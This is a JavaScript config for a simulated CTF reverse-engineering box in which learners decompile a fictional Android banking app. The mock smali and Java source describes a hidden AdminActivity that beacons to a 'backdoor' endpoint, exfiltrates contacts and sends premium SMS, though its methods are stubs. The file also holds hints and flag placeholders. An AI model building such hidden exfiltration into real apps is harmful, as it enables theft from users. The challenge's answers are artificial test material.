/* ============================================================
   CTF ARENA — Box REV-05: The Mobile Vault
   Reverse Engineering | Android APK Analysis
   Config: APK structure, decompiled code, flags, hints, lore
   ============================================================ */

const Rev05Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Mobile Vault',
    subtitle: 'Reverse Engineering — Android APK Analysis',
    difficulty: 'Advanced',
    accent: '#16a34a',
    storageKey: 'hexworth_ctf_rev05',
    registryId: 'rev-05-android',
    trackerKey: 'ctf_rev05',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'APK Examination',
            icon: '\uD83D\uDCF1',
            description: 'Examine the APK file structure and manifest to understand the app.',
            requiredFlags: [],
            mitre: ['T1407', 'T1418'],
            unlocks: ['decompilation'],
            locked: false
        },
        {
            id: 'decompilation',
            name: 'Decompilation',
            icon: '\uD83D\uDD27',
            description: 'Decompile the APK and analyze the Java/Smali source code.',
            requiredFlags: [],
            mitre: ['T1027', 'T1059'],
            unlocks: ['secrets'],
            locked: true
        },
        {
            id: 'secrets',
            name: 'Secret Discovery',
            icon: '\uD83D\uDD11',
            description: 'Find hardcoded API keys, hidden activities, and embedded credentials.',
            requiredFlags: ['user'],
            mitre: ['T1552.001', 'T1552.004'],
            unlocks: ['hidden'],
            locked: true
        },
        {
            id: 'hidden',
            name: 'Hidden Functionality',
            icon: '\uD83D\uDC7B',
            description: 'Discover the hidden admin activity and extract the master key.',
            requiredFlags: ['root'],
            mitre: ['T1398', 'T1407.001'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Decompile the APK',
                tip: 'Run: apktool d /home/kali/challenge/vault.apk to decompile the APK.',
                trigger: { event: 'command', match: { cmd: 'contains:apktool' } }
            },
            {
                title: 'Examine the manifest',
                tip: 'Read AndroidManifest.xml to find all activities, permissions, and components.',
                trigger: { event: 'command', match: { cmd: 'contains:cat' } }
            },
            {
                title: 'Search for hardcoded secrets',
                tip: 'Use grep to search for API keys, passwords, and flags in the decompiled source.',
                trigger: { event: 'command', match: { cmd: 'contains:grep' } }
            },
            {
                title: 'Find the API key',
                tip: 'The strings.xml or BuildConfig contains the hardcoded API key (user flag).',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Discover the hidden admin activity',
                tip: 'The manifest lists an unexported AdminActivity. Find its hardcoded master key.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '2.3', description: 'Given a scenario, analyze indicators of malicious activity — Mobile app analysis', skill: 'APK Decompilation' },
            { flagId: 'user', objective: '2.5', description: 'Given a scenario, analyze indicators of malicious activity — Hardcoded credentials', skill: 'Secret Discovery' },
            { flagId: 'root', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Hidden functionality', skill: 'Hidden Activity Analysis' },
            { flagId: 'root', objective: '4.5', description: 'Given a scenario, modify enterprise capabilities to enhance security — Mobile', skill: 'Mobile App Security Assessment' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nChallenge APK: /home/kali/challenge/vault.apk\n'
    },

    // ═══════════════════════════════════════════════════════
    // APK DATA
    // ═══════════════════════════════════════════════════════

    _apkData: {
        packageName: 'com.vaultcorp.securevault',
        versionName: '2.4.1',
        versionCode: 24,
        activities: [
            'com.vaultcorp.securevault.MainActivity',
            'com.vaultcorp.securevault.LoginActivity',
            'com.vaultcorp.securevault.VaultActivity',
            'com.vaultcorp.securevault.SettingsActivity',
            'com.vaultcorp.securevault.AdminActivity'
        ],
        permissions: [
            'android.permission.INTERNET',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.CAMERA',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.READ_CONTACTS',
            'android.permission.SEND_SMS'
        ],
        apiKey: 'sk-vault-7Kx9mN2pL4qR8tY3wZ6v',
        adminMasterKey: 'VAULT-ADMIN-MASTER-X9K7'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 1800
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Use apktool to decompile: apktool d vault.apk. Then examine AndroidManifest.xml for activities and permissions.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Search decompiled resources for API keys: grep -r "api_key\\|API_KEY\\|secret" vault/res/values/',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'The strings.xml has the API key (user flag). The AdminActivity has the master key (root flag).',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Use jadx to view AdminActivity.java source code. The MASTER_KEY constant contains the root flag.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'A financial services app called "SecureVault" is suspected of containing hidden functionality and hardcoded credentials. The APK has been pulled from a compromised device. Your mission: decompile the app, find all secrets, and discover the hidden admin backdoor.',
        scenario: 'A banking customer reported unauthorized transactions after installing the SecureVault app from a third-party store. The APK requests excessive permissions and may contain a hidden admin interface. The mobile forensics team needs a full security analysis before filing a report with the financial regulator.',
        outro: 'The Mobile Vault is cracked open. The app contained a hardcoded API key in strings.xml, excessive permissions (SMS, contacts, location), and a completely hidden AdminActivity with a master key that bypasses all authentication. The app is confirmed malicious.',
        ecer: {
            executive: 'No mobile application security testing (MAST) requirement for app store submissions',
            culture: 'Third-party app stores operate without security vetting',
            employee: 'Developer hardcoded API keys and admin credentials directly in source code',
            regulatory: 'Financial apps require PCI DSS compliance, which prohibits hardcoded credentials'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://mobile-analysis.local/',

        pages: {
            '/': {
                title: 'Mobile Analysis Workbench',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                        <h1 style="color:#16a34a; font-size:1.6rem; margin-bottom:4px;">Mobile Analysis Workbench</h1>
                        <div style="color:#888; font-size:0.8rem;">Android APK Reverse Engineering</div>
                    </div>
                    <div style="max-width:600px; margin:0 auto; padding:20px;">
                        <h3 style="color:#16a34a;">APK Analysis Tools</h3>
                        <ul style="color:#666; font-size:0.85rem; line-height:1.8;">
                            <li><code>apktool d &lt;file.apk&gt;</code> — Decompile APK (resources + smali)</li>
                            <li><code>jadx &lt;file.apk&gt;</code> — Decompile to Java source</li>
                            <li><code>dex2jar &lt;file.apk&gt;</code> — Convert DEX to JAR</li>
                            <li><code>grep -r &lt;pattern&gt; vault/</code> — Search decompiled code</li>
                        </ul>
                        <div style="margin-top:15px; padding:12px; background:#f0fdf4; border:1px solid #86efac; border-radius:6px;">
                            <strong>Target:</strong> /home/kali/challenge/vault.apk<br>
                            <small>Package: com.vaultcorp.securevault v2.4.1</small>
                        </div>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: vault.apk (SecureVault financial app)\nObjective: Full APK security analysis\n\nSteps:\n1. Decompile APK with apktool\n2. Read AndroidManifest.xml\n3. Search for hardcoded secrets\n4. Analyze Java source with jadx\n5. Find hidden activities and backdoors\n\nGood luck, operator.'
                                },
                                'challenge': {
                                    type: 'dir',
                                    children: {
                                        'vault.apk': {
                                            type: 'file',
                                            content: '[Android APK archive, 4.2 MB]\nPackage: com.vaultcorp.securevault\nVersion: 2.4.1 (24)\nMin SDK: 26 (Android 8.0)\nTarget SDK: 34 (Android 14)'
                                        }
                                    }
                                },
                                'vault': {
                                    type: 'dir',
                                    children: {
                                        'AndroidManifest.xml': {
                                            type: 'file',
                                            content: '<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android"\n    package="com.vaultcorp.securevault"\n    android:versionCode="24"\n    android:versionName="2.4.1">\n\n    <uses-permission android:name="android.permission.INTERNET" />\n    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />\n    <uses-permission android:name="android.permission.CAMERA" />\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\n    <uses-permission android:name="android.permission.READ_CONTACTS" />\n    <uses-permission android:name="android.permission.SEND_SMS" />\n\n    <application android:label="SecureVault" android:icon="@mipmap/ic_launcher">\n\n        <activity android:name=".MainActivity" android:exported="true">\n            <intent-filter>\n                <action android:name="android.intent.action.MAIN" />\n                <category android:name="android.intent.category.LAUNCHER" />\n            </intent-filter>\n        </activity>\n\n        <activity android:name=".LoginActivity" android:exported="false" />\n        <activity android:name=".VaultActivity" android:exported="false" />\n        <activity android:name=".SettingsActivity" android:exported="false" />\n\n        <!-- Hidden admin panel - not referenced in any UI -->\n        <activity android:name=".AdminActivity"\n            android:exported="false"\n            android:theme="@android:style/Theme.NoDisplay" />\n\n    </application>\n</manifest>'
                                        },
                                        'res': {
                                            type: 'dir',
                                            children: {
                                                'values': {
                                                    type: 'dir',
                                                    children: {
                                                        'strings.xml': {
                                                            type: 'file',
                                                            content: '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <string name="app_name">SecureVault</string>\n    <string name="login_hint">Enter your PIN</string>\n    <string name="vault_title">My Vault</string>\n    <string name="api_key">{{FLAG:user}}</string>\n    <string name="api_endpoint">https://api.vaultcorp.com/v2</string>\n    <string name="debug_server">http://192.168.1.100:8080/debug</string>\n    <string name="firebase_url">https://securevault-prod.firebaseio.com</string>\n</resources>'
                                                        }
                                                    }
                                                }
                                            }
                                        },
                                        'smali': {
                                            type: 'dir',
                                            children: {
                                                'com': {
                                                    type: 'dir',
                                                    children: {
                                                        'vaultcorp': {
                                                            type: 'dir',
                                                            children: {
                                                                'securevault': {
                                                                    type: 'dir',
                                                                    children: {
                                                                        'MainActivity.smali': {
                                                                            type: 'file',
                                                                            content: '.class public Lcom/vaultcorp/securevault/MainActivity;\n.super Landroidx/appcompat/app/AppCompatActivity;\n\n.method protected onCreate(Landroid/os/Bundle;)V\n    .locals 2\n    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V\n    const v0, 0x7f0b001c\n    invoke-virtual {p0, v0}, Lcom/vaultcorp/securevault/MainActivity;->setContentView(I)V\n    return-void\n.end method'
                                                                        },
                                                                        'AdminActivity.smali': {
                                                                            type: 'file',
                                                                            content: '.class public Lcom/vaultcorp/securevault/AdminActivity;\n.super Landroidx/appcompat/app/AppCompatActivity;\n\n.field private static final MASTER_KEY:Ljava/lang/String; = "{{FLAG:root}}"\n.field private static final ADMIN_ENDPOINT:Ljava/lang/String; = "https://admin.vaultcorp.com/backdoor"\n\n.method protected onCreate(Landroid/os/Bundle;)V\n    .locals 3\n    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V\n    \n    ;; Send device info to admin endpoint\n    sget-object v0, Lcom/vaultcorp/securevault/AdminActivity;->MASTER_KEY:Ljava/lang/String;\n    sget-object v1, Lcom/vaultcorp/securevault/AdminActivity;->ADMIN_ENDPOINT:Ljava/lang/String;\n    invoke-static {v1, v0}, Lcom/vaultcorp/securevault/NetworkUtil;->sendData(Ljava/lang/String;Ljava/lang/String;)V\n    \n    ;; Exfiltrate contacts\n    invoke-virtual {p0}, Lcom/vaultcorp/securevault/AdminActivity;->exfiltrateContacts()V\n    \n    ;; Send SMS to premium number\n    const-string v2, "+1-900-555-0199"\n    invoke-static {v2}, Lcom/vaultcorp/securevault/SmsUtil;->sendPremiumSms(Ljava/lang/String;)V\n    \n    return-void\n.end method\n\n.method private exfiltrateContacts()V\n    ;; Reads all contacts and sends to admin endpoint\n    return-void\n.end method'
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'apktool d challenge/vault.apk\ncat vault/AndroidManifest.xml\ngrep -r "api_key" vault/'
                                }
                            }
                        }
                    }
                },
                'usr': { type: 'dir', children: { 'share': { type: 'dir', children: {} } } },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'passwd': { type: 'file', content: 'root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash' }
                    }
                },
                'tmp': { type: 'dir', children: {} }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {
        'apktool': function(args) {
            if (args.length === 0) return 'Usage: apktool d <file.apk> [-o output_dir]';
            if (args.includes('d')) {
                return `I: Using Apktool 2.9.3 on vault.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...

Decompiled to: /home/kali/vault/
  AndroidManifest.xml
  res/values/strings.xml
  res/layout/activity_main.xml
  smali/com/vaultcorp/securevault/MainActivity.smali
  smali/com/vaultcorp/securevault/LoginActivity.smali
  smali/com/vaultcorp/securevault/VaultActivity.smali
  smali/com/vaultcorp/securevault/SettingsActivity.smali
  smali/com/vaultcorp/securevault/AdminActivity.smali
  smali/com/vaultcorp/securevault/NetworkUtil.smali
  smali/com/vaultcorp/securevault/SmsUtil.smali`;
            }
            return 'Usage: apktool d <file.apk>';
        },

        'jadx': function(args) {
            if (args.length === 0) return 'Usage: jadx [OPTIONS] <file.apk|dex>';
            return `INFO  - loading ...
INFO  - processing ...
INFO  - done

=== AdminActivity.java ===
package com.vaultcorp.securevault;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class AdminActivity extends AppCompatActivity {
    private static final String MASTER_KEY = "{{FLAG:root}}";
    private static final String ADMIN_ENDPOINT = "https://admin.vaultcorp.com/backdoor";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Send device info + master key to admin endpoint
        NetworkUtil.sendData(ADMIN_ENDPOINT, MASTER_KEY);
        // Exfiltrate all contacts
        exfiltrateContacts();
        // Send SMS to premium-rate number
        SmsUtil.sendPremiumSms("+1-900-555-0199");
    }

    private void exfiltrateContacts() {
        // Reads all device contacts and exfiltrates to C2
    }
}

=== MainActivity.java ===
package com.vaultcorp.securevault;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // API key loaded from strings.xml: {{FLAG:user}}
    }
}`;
        },

        'grep': function(args) {
            if (args.length < 2) return 'Usage: grep [OPTIONS] PATTERN [FILE...]';
            const pattern = args.find(a => !a.startsWith('-')) || '';
            const lower = pattern.toLowerCase();

            if (lower.includes('api_key') || lower.includes('api key') || lower.includes('flag')) {
                return `vault/res/values/strings.xml:    <string name="api_key">{{FLAG:user}}</string>
vault/smali/com/vaultcorp/securevault/AdminActivity.smali:.field private static final MASTER_KEY:Ljava/lang/String; = "{{FLAG:root}}"`;
            }
            if (lower.includes('master') || lower.includes('admin') || lower.includes('secret') || lower.includes('password')) {
                return `vault/AndroidManifest.xml:        <activity android:name=".AdminActivity"
vault/smali/com/vaultcorp/securevault/AdminActivity.smali:.field private static final MASTER_KEY:Ljava/lang/String; = "{{FLAG:root}}"
vault/smali/com/vaultcorp/securevault/AdminActivity.smali:.field private static final ADMIN_ENDPOINT:Ljava/lang/String; = "https://admin.vaultcorp.com/backdoor"`;
            }
            if (lower.includes('permission') || lower.includes('sms') || lower.includes('contact') || lower.includes('location')) {
                return `vault/AndroidManifest.xml:    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
vault/AndroidManifest.xml:    <uses-permission android:name="android.permission.READ_CONTACTS" />
vault/AndroidManifest.xml:    <uses-permission android:name="android.permission.SEND_SMS" />
vault/smali/com/vaultcorp/securevault/AdminActivity.smali:    invoke-virtual {p0}, Lcom/vaultcorp/securevault/AdminActivity;->exfiltrateContacts()V
vault/smali/com/vaultcorp/securevault/AdminActivity.smali:    const-string v2, "+1-900-555-0199"`;
            }
            if (lower.includes('http') || lower.includes('url') || lower.includes('endpoint')) {
                return `vault/res/values/strings.xml:    <string name="api_endpoint">https://api.vaultcorp.com/v2</string>
vault/res/values/strings.xml:    <string name="debug_server">http://192.168.1.100:8080/debug</string>
vault/res/values/strings.xml:    <string name="firebase_url">https://securevault-prod.firebaseio.com</string>
vault/smali/com/vaultcorp/securevault/AdminActivity.smali:    ADMIN_ENDPOINT = "https://admin.vaultcorp.com/backdoor"`;
            }
            return '';
        },

        'strings': function(args) {
            if (args.length === 0) return 'Usage: strings [OPTIONS] FILE';
            return `classes.dex
AndroidManifest.xml
res/layout/activity_main.xml
com.vaultcorp.securevault
SecureVault
{{FLAG:user}}
https://api.vaultcorp.com/v2
http://192.168.1.100:8080/debug
{{FLAG:root}}
https://admin.vaultcorp.com/backdoor
+1-900-555-0199
exfiltrateContacts
sendPremiumSms
MASTER_KEY
ADMIN_ENDPOINT`;
        },

        'find': function(args) {
            if (args.length === 0) return 'Usage: find [path] [expression]';
            const path = args[0] || '.';
            if (path.includes('vault') || path === '.') {
                return `vault/AndroidManifest.xml
vault/res/values/strings.xml
vault/res/layout/activity_main.xml
vault/smali/com/vaultcorp/securevault/MainActivity.smali
vault/smali/com/vaultcorp/securevault/LoginActivity.smali
vault/smali/com/vaultcorp/securevault/VaultActivity.smali
vault/smali/com/vaultcorp/securevault/SettingsActivity.smali
vault/smali/com/vaultcorp/securevault/AdminActivity.smali
vault/smali/com/vaultcorp/securevault/NetworkUtil.smali
vault/smali/com/vaultcorp/securevault/SmsUtil.smali`;
            }
            return '';
        },

        'cat': function(args) {
            if (args.length === 0) return 'Usage: cat [FILE...]';
            // Handled by filesystem, but provide fallback hints
            return '';
        },

        'dex2jar': function(args) {
            if (args.length === 0) return 'Usage: dex2jar <file.apk>';
            return `dex2jar vault.apk -> vault-dex2jar.jar
Done. Use jd-gui to examine the JAR file.`;
        },

        'file': function(args) {
            if (args.length === 0) return 'Usage: file <filename>';
            const f = args[args.length - 1];
            if (f.includes('.apk')) {
                return `vault.apk: Zip archive data (APK), at least v2.0 to extract
  Package: com.vaultcorp.securevault
  Version: 2.4.1
  Min SDK: 26
  Target SDK: 34
  Signed: v2 scheme`;
            }
            return `${f}: data`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        return tmp.textContent.trim();
    }
};
